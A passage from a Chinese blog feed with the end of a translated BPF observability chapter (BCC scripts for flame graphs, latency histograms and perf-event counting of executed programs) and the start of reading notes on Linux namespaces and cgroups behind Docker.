ev_config=PerfSWConfig.CPU_CLOCK,</span><br><span class="line">                      fn_name=<span class="string">'collect_stack_traces'</span>,</span><br><span class="line">                      sample_period=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">exiting = <span class="number">0</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    exiting = <span class="number">1</span></span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"dumping the results"</span>)</span><br><span class="line"><span class="keyword">for</span> trace, acc <span class="keyword">in</span> sorted(bpf[<span class="string">'cache'</span>].items(), key=<span class="keyword">lambda</span> cache: cache[<span class="number">1</span>].value):</span><br><span class="line">    line = []</span><br><span class="line">    <span class="keyword">if</span> trace.stack_id &lt; <span class="number">0</span> <span class="keyword">and</span> trace.stack_id == -errno.EFAULT:</span><br><span class="line">        line = [<span class="string">'Unknown stack'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stack_trace = list(bpf[<span class="string">'traces'</span>].walk(trace.stack_id))</span><br><span class="line">        <span class="keyword">for</span> stack_address <span class="keyword">in</span> reversed(stack_trace):</span><br><span class="line">            function_name = bpf.sym(stack_address, program_pid).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">if</span> function_name == <span class="string">'[unknown]'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            line.extend([function_name])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(line) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    frame = <span class="string">";"</span>.join(line)</span><br><span class="line">    sys.stdout.write(<span class="string">"%s %d\n"</span> % (frame, acc.value))</span><br><span class="line">    <span class="keyword">if</span> exiting:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>随着我们的BPF分析器完成，我们可以将它运行以收集我们Go程序的堆栈跟踪。 我们需要将Go程序的进程ID传递给我们的分析器，以确保我们只收集此应用程序的跟踪；我们可以使用<code>pgrep</code>找到该PID。</p><p>首先我们需要将Go程序运行起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos flamegraph]# go run main.go</span><br></pre></td></tr></table></figure><p>如果你将探测器保存在名为<code>profiler.py</code>的文件中，下面就是运行探测器的方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos flamegraph]# python3 profiler.py `pgrep -nx go` &gt; /tmp/profile.out</span><br></pre></td></tr></table></figure><p><code>pgrep</code>将在PID中搜索名称与go匹配的系统上运行的进程。我们将分析器的输出发送到一个临时文件，以便我们可以生成火焰图可视化。</p><p>正如我们之前提到的，我们将使用<code>Brendan Gregg</code>的`FlameGraph脚本为我们的图生成一个SVG文件； 你可以在<a href="!https://github.com/brendangregg/FlameGraph">GitHub</a>中找到这些脚本。 下载后可以使用 flamegraph.pl 生成图。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos FlameGraph]# ./flamegraph.pl /tmp/profile.out &gt; /tmp/flamegraph.svg</span><br></pre></td></tr></table></figure><p>使用浏览器打开图片如下</p><p><img src="/2022/05/27/使用BPF的Linux可观测性-上篇-翻译/1.png" alt="1"></p><p>这种探查器对于跟踪系统中的性能问题很有用。 BCC已经包含一个比我们示例中的更高级的分析器，可以直接在生产环境中使用。除了分析器之外，BCC还包括了帮助生成CPU外火焰图和许多其他可视化来分析系统的工具。</p><h4 id="直方图"><a href="#直方图" class="headerlink" title="直方图"></a>直方图</h4><p>直方图是显示多个值范围出现频率的图表。表示这一点的数字数据被分成桶，每个桶包含桶内任何数据点的出现次数。直方图测量的频率是每个桶的高度和宽度的组合。如果桶被分成相等的范围，这个频率匹配直方图的高度，但如果范围没有被平均划分，你需要将每个高度乘以每个宽度来找到正确的频率。</p><p>直方图是进行系统性能分析的基本组成部分。它们是表示可测量事件（如指令延迟）分布的绝佳工具，因为它们显示的信息比通过其他测量（如平均值）获得的更准确。</p><p>BPF程序可以基于许多指标创建直方图。你可以使用BPF图来收集信息，将其分类到桶中，然后为你的数据生成直方图表示。实现这个逻辑并不复杂，但是如果每次需要分析程序的输出时都想打印直方图就会变得乏味。BCC包含一个开箱即用的实现，可以在每个程序中重复使用，而无需每次手动计算分桶和频率。</p><p>作为一个有趣的实验，我们将展示如何使用BCC的直方图来可视化应用程序调用<code>bpf_prog_load</code>指令时加载BPF程序所引入的延迟。我们使用<code>kprobes</code>来收集该指令完成所需的时间，并将结果累积在一个直方图中，稍后我们将对其进行可视化。为了便于理解，我们将这个示例分成了几个部分。</p><p>第一部分包括了BPF程序的初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">BPF_HISTOGRAM(histogram);</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_start(void *ctx) &#123;1</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();2</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);3</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：使用宏创建BPF哈希映射来存储触发<code>bpf_prog_load</code>指令的初始时间。</p><p>2：使用新的宏创建BPF直方图。这不是原生BPF映射；BCC包含此宏，以便让你更轻松地创建这些可视化。在底层，这个BPF直方图使用数组映射来存储信息。它还有几个助手来进行分桶并创建最终图。</p><p>3：当应用程序触发我们要跟踪的指令时，使用程序 PID 来存储。</p><p>让我们看看我们如何计算延迟的增量并将其存储在我们的直方图中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_return(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 *start_time_ns, delta;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  delta = bpf_ktime_get_ns() - *start_time_ns;1</span></span><br><span class="line"><span class="string">  histogram.increment(bpf_log2l(delta));2</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：计算指令被调用的时间和我们的程序到达这里的时间之间的增量； 我们可以假设这也是指令完成的时间。</p><p>2：将该增量存储在我们的直方图中。我们在这条线上做了两个操作。 首先，我们使用内置函数<code>bpf_log2l</code>为 <code>delta</code>的值生成桶标识符。此功能会随着时间的推移创建稳定的值分布。然后，我们使用增量函数向这个桶中添加一个新项目。默认情况下，如果直方图中存在<code>bucket</code>，则<code>increment</code>会将该值加1，否则会启动一个值为1的新bucket，因此无需担心该值是否存在。</p><p>我们需要编写的最后一段代码将这两个函数附加到有效的<code>kprobe</code>上，并在屏幕上打印直方图，以便我们可以看到延迟分布。这部分是我们初始化BPF程序并等待事件生成直方图的地方：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_kprobe(event=<span class="string">"bpf_prog_load"</span>, fn_name=<span class="string">"trace_bpf_prog_load_start"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=<span class="string">"bpf_prog_load"</span>,</span><br><span class="line">                     fn_name=<span class="string">"trace_bpf_prog_load_return"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"histogram"</span>].print_log2_hist(<span class="string">"msecs"</span>)</span><br></pre></td></tr></table></figure><p>正如我们在本节开头提到的，直方图可用于观察系统中的异常情况。BCC工具包括许多使用直方图表示数据的脚本。需要深入了解系统时可以查看它们。</p><p><code>histogram.py</code>完整代码如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signal_ignore</span><span class="params">(signal, frame)</span>:</span></span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">BPF_HISTOGRAM(histogram);</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_start(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_return(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 *start_time_ns, delta;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  delta = bpf_ktime_get_ns() - *start_time_ns;</span></span><br><span class="line"><span class="string">  histogram.increment(bpf_log2l(delta));</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_kprobe(event=<span class="string">"bpf_prog_load"</span>, fn_name=<span class="string">"trace_bpf_prog_load_start"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=<span class="string">"bpf_prog_load"</span>,</span><br><span class="line">                     fn_name=<span class="string">"trace_bpf_prog_load_return"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"histogram"</span>].print_log2_hist(<span class="string">"msecs"</span>)</span><br></pre></td></tr></table></figure><h4 id="Perf-Events"><a href="#Perf-Events" class="headerlink" title="Perf Events"></a>Perf Events</h4><p>我们相信<code>Perf</code>事件可能是成功使用BPF跟踪所需掌握的最重要的通信方法。我们在前一章中讨论了<code>BPF Perf</code>事件数组映射。它们允许你将数据放入与用户空间程序实时同步的环形缓冲区中。当你在BPF程序中收集大量数据，并希望将处理可视化工作转移到用户空间程序时，这是一个理想的选择。这将允许你对表示层进行更多控制，因为在编程能力方面不受BPF虚拟机的限制。你可以找到的大多数BPF跟踪程序的目的是使用<code>Perf</code>事件。</p><p>这里我们将展示如何使用它们提取有关二进制执行的信息，并对这些信息进行分类，以打印系统中执行最多的二进制文件。我们已将此示例分为两个代码块，以便你可以轻松地了解此示例。在第一块中，我们定义BPF程序并将其附加到<code>kprobe</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_PERF_OUTPUT(events);1</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx, void filename, void argv, void envp) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  events.perf_submit(ctx, &amp;comm, sizeof(comm));2</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">bpf = BPF(text = bpf_source)<span class="number">3</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kprobe(event = execve_function, fn_name = <span class="string">"do_sys_execve"</span>)</span><br></pre></td></tr></table></figure><p>1：使用<code>BPF_PERF_OUTPUT</code>输出声明<code>Perf</code>事件映射。这是BCC提供的用于声明此类映射的宏。我们将此映射命名为<code>events</code>。</p><p>2：在获得内核执行的程序的名称后，将其发送到用户空间进行聚合。我们使用<code>perf_submit</code>来实现这一点。此函数使用我们的新信息更新<code>Perf events</code>映射。</p><p>3：初始化BPF程序并将其附着到<code>kprobe</code>，以便在系统中执行新程序时触发。</p><p>现在我们已经编写了收集系统中执行的所有程序的代码，我们需要在用户空间中聚合它们。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">aggregates = Counter()<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aggregate_programs</span><span class="params">(cpu, data, size)</span>:</span><span class="number">2</span></span><br><span class="line">  comm = bpf[<span class="string">"events"</span>].event(data)<span class="number">3</span></span><br><span class="line">  aggregates[comm] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"events"</span>].open_perf_buffer(aggregate_programs)<span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      bpf.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:<span class="number">5</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (comm, times) <span class="keyword">in</span> aggregates.most_common(): </span><br><span class="line">  print(<span class="string">"Program &#123;&#125; executed &#123;&#125; times"</span>.format(comm, times))</span><br></pre></td></tr></table></figure><p>1：声明一个计数器来存储我们的程序信息。我们使用程序的名称作为键，值将是计数器。我们使用<code>aggregate_ programs</code>函数从<code>Perf</code>事件映射中收集数据。在本例中可以看到我们如何使用BCC宏访问映射并从堆栈顶部提取下一个传入数据事件。</p><p>2：增加我们收到具有相同程序名称的事件的次数。</p><p>3：使用函数<code>open_perf_buffer</code>告诉BCC，每次从<code>Perf events</code>映射接收到事件时，它都需要执行<code>aggregate</code>函数程序。</p><p>4：BCC在打开环形缓冲区后轮询事件，直到我们中断此Python程序。等待的时间越长，处理的信息就越多。可以看到我们如何使用<code>perf_buffer_poll</code></p><p>5：使用<code>most_common</code>函数获取计数器和循环中的元素列表，以打印系统中执行次数最多的程序。</p><p><code>perf_events.py</code>完整代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_PERF_OUTPUT(events);</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx, void filename, void argv, void envp) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  events.perf_submit(ctx, &amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kprobe(event = execve_function, fn_name = <span class="string">"do_sys_execve"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">aggregates = Counter()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aggregate_programs</span><span class="params">(cpu, data, size)</span>:</span></span><br><span class="line">  comm = bpf[<span class="string">"events"</span>].event(data)</span><br><span class="line">  aggregates[comm] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"events"</span>].open_perf_buffer(aggregate_programs)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      bpf.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (comm, times) <span class="keyword">in</span> aggregates.most_common(): </span><br><span class="line">  print(<span class="string">"Program &#123;&#125; executed &#123;&#125; times"</span>.format(comm, times))</span><br></pre></td></tr></table></figure><h3 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h3><p>在本章中，我们只触及了使用BPF进行跟踪的表面。Linux内核允许您访问其他工具更难以获取的信息。BPF使此过程更具可预测性，因为它提供了访问此数据的公共接口。在后面的章节中，您将看到更多使用此处描述的一些技术的示例，例如将函数附着到跟踪点。</p><p>在下一章中，我们将展示系统社区在BPF基础上构建的一些工具，用于进行性能分析和跟踪。这些专用工具可以让你访问我们看到的打包格式的大部分信息。这样你就不需要重写已经存在的工具。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一章节&quot;&gt;&lt;a href=&quot;#第一章节&quot; class=&quot;headerlink&quot; title=&quot;第一章节&quot;&gt;&lt;/a&gt;第一章节&lt;/h2&gt;&lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>自己动手写Docker阅读笔记</title>
    <link href="elssm.github.io/2022/04/05/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99Docker%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2022/04/05/自己动手写Docker阅读笔记/</id>
    <published>2022-04-05T08:58:17.000Z</published>
    <updated>2022-05-15T06:12:20.754Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h4><h5 id="concept"><a href="#concept" class="headerlink" title="concept"></a>concept</h5><p><code>Linux Namespace</code>是Kernel的一个功能，它可以隔离一系列的系统资源。例如PID、UserID、Network等。<code>Namespace</code>也可以在一些资源上，将进程隔离起来，这些资源包括进程树、网络接口、挂载点等。</p><p>例如一家公司向外界出售自己的计算资源。但是需要将不同的客户隔离起来。这个时候，<code>Linux Namespace</code>就派上了用场，使用<code>Namespace</code>就可以做到UID级别的隔离，也就是说，可以以UID为n的用户，虚拟化出来一个<code>Namespace</code>，在这个<code>Namespace</code>里面，用户是具有root权限的。但是在真实的物理机器上，他还是那个以UID为n的用户。</p><p>除了<code>User Namespace</code>，PID也是可以被虚拟的。命名空间建立系统的不同视图。从用户的角度来看，每一个命名空间应该像一台单独的Linux计算机一样，有自己的<code>init</code>进程(PID为1)，其他进程的PID依次递增。A和B空间都有PID为1的<code>init</code>进程，子命名空间的进程映射到父命名空间的进程上，父命名空间可以知道每一个子命名空间的运行状态，而子命名空间与子命名空间之间是隔离的。</p><p>如下图所示，进程3在父命名空间中的PID为 3，但是在子命名空间内，它的PID就是1。也就是说用户从子命名空间A内看进程3就像<code>init</code>进程一样，以为这个进程是自己的初始化进程，但是从整个host来看，它其实只是3号进程虚拟化出来的一个空间而己。</p><p><img src="/2022/04/05/自己动手写Docker阅读笔记/1.png" alt="1"></p><p>当前Linux一共实现了6种不同类型的<code>Namespace</code></p><p><img src="/2022/04/05/自己动手写Docker阅读笔记/2.png" alt="2"></p><p><code>Namespace</code>的API主要是用如下3个系统调用</p><ul><li><code>clone()</code>创建新进程。根据系统调用参数来判断哪些类型的<code>Namespace</code>被创建，而且它们的子进程也会被包含到这些<code>Namespace</code>中</li><li><code>unshare()</code>将进程移出某个<code>Namespace</code></li><li><code>setns()</code>将进程加入到<code>Namespace</code>中</li></ul><h5 id="UTS-Namespace"><a href="#UTS-Namespace" class="headerlink" title="UTS Namespace"></a>UTS Namespace</h5><p><code>UTS Namespace</code>主要用来隔离<code>nodename</code>和<code>domainname</code>两个系统标识。在<code>UTS Namespace</code>里面，每个<code>Namespace</code>允许有自己的<code>hostname</code></p><p>输出当前的PID</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $$</span><br></pre></td></tr></table></figure><p>查看进程的UTS</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readlink /proc/&lt;PID&gt;/ns/uts</span><br></pre></td></tr></table></figure><h5 id="IPC-Namespace"><a href="#IPC-Namespace" class="headerlink" title="IPC Namespace"></a>IPC Namespace</h5><p><code>IPC Namespace</code>用来隔离<code>System V IPC</code>和<code>POSIX message queues</code>。每一个<code>IPC Namespace</code>都有自己的<code>System V IPC</code>和<code>POSIX message queues</code></p><p>查看现有的<code>ipc Message Queues</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipcs -q</span><br></pre></td></tr></table></figure><h5 id="PID-Namespace"><a href="#PID-Namespace" class="headerlink" title="PID Namespace"></a>PID Namespace</h5><p><code>PID Namespace</code>是用来隔离进程ID的。同样一个进程在不同的<code>PID Namespace</code>里可以拥有不同的PID。这样就可以理解，在<code>docker container</code>里面，使用<code>ps-ef</code>经常会发现，在容器 内，前台运行的那个进程PID是1，但是在容器外，使用<code>ps -ef</code>会发现同样的进程却有不同的PID，这就是<code>PID Namespace</code>做的事情</p><p>查看进程树</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pstree -pl</span><br></pre></td></tr></table></figure><h5 id="Mount-Namespace"><a href="#Mount-Namespace" class="headerlink" title="Mount Namespace"></a>Mount Namespace</h5><p><code>Mount Namespace</code>用来隔离各个进程看到的挂载点视图。在不同<code>Namespace</code>的进程中， 看 到的文件系统层次是不一样的。在<code>Mount Namespace</code>中调用<code>mount()</code>和<code>umount()</code>仅仅只会影响当前<code>Namespace</code>内的文件系统 ，而对全局的文件系统是没有影响的</p><h5 id="User-Namespace"><a href="#User-Namespace" class="headerlink" title="User Namespace"></a>User Namespace</h5><p><code>User Namespace</code>主要是隔离用户的用户组ID。也就是说，一个进程的<code>User ID</code>和<code>Group ID</code>在<code>User Namespace</code>内外可以是不同的。比较常用的是，在宿主机上以一个非root用户运行 创建一个<code>User Namespace</code>， 然后在<code>User Namespace</code>里面却映射成root用户。这意味着， 这个进程在<code>User Namespace</code>里面有root权限，但是在<code>User Namespace</code>外面却没有root的权限。从<code>Linux Kernel 3.8</code>开始，非root进程也可以创建<code>User Namespace</code>，并且此用户在<code>Namespace</code>里面可以被映射成root，且在<code>Namespace</code>内有root权限</p><h5 id="Network-Namespace"><a href="#Network-Namespace" class="headerlink" title="Network Namespace"></a>Network Namespace</h5><p><code>Network Namespace</code>是用来隔离网络设备、IP地址端口等网络栈的<code>Namespace</code>。<code>Network Namespace</code>可以让每个容器拥有自己独立的(虚拟的)网络设备，而且容器内的应用可以绑定到自己的端口，每个<code>Namespace</code>内的端口都不会互相冲突。在宿主机上搭建网桥后，就能很方 便地实现容器之间的通信，而且不同容器上的应用可以使用相同的端口</p><h4 id="Cgroups"><a href="#Cgroups" class="headerlink" title="Cgroups"></a>Cgroups</h4><h5 id="concept-1"><a href="#concept-1" class="headerlink" title="concept"></a>concept</h5><p><code>Namespace</code>技术能够帮助进程隔离出自己单独的空间，但是Docker是怎么限制每个空间的大小，保证它们不会互相争夺呢。这里就用到了<code>Cgroups</code>技术。</p><p><code>Linux Cgroups</code>(Control Groups)提供了对一组进程及将来子进程的资源限制、控制和统计的能力，这些资源包括CPU、内存、存储、网络等。通过<code>Cgroups</code>，可以方便地限制某个进 程的资源占用，并且可以实时地监控进程的监控和统计信息</p><h5 id="Cgroups中的3个组件"><a href="#Cgroups中的3个组件" class="headerlink" title="Cgroups中的3个组件"></a>Cgroups中的3个组件</h5><ul><li><code>cgroup</code>是对进程分组管理的一种机制，一个<code>cgroup</code>包含一组进程，并可以在这个<code>cgroup</code>上增加<code>Linux subsystem</code>的各种参数配置，将一组进程和一组<code>subsystem</code>的系统参数关联起来。</li><li><code>subsystem</code>是一组资源控制的模块，一般包含如下几项<ul><li><code>blkio</code>设置对块设备(比如硬盘)输入输出的访问控制</li><li><code>cpu</code>设置<code>cgroup</code>中进程的<code>CPU</code>被调度的策略</li><li><code>cpuacct</code>可以统计<code>cgroup</code>中进程的<code>CPU</code>占用</li><li><code>cpuset</code>在多核机器上设置<code>cgroup</code>中进程可以使用的<code>CPU</code>和内存(此处内存仅使用于NUMA 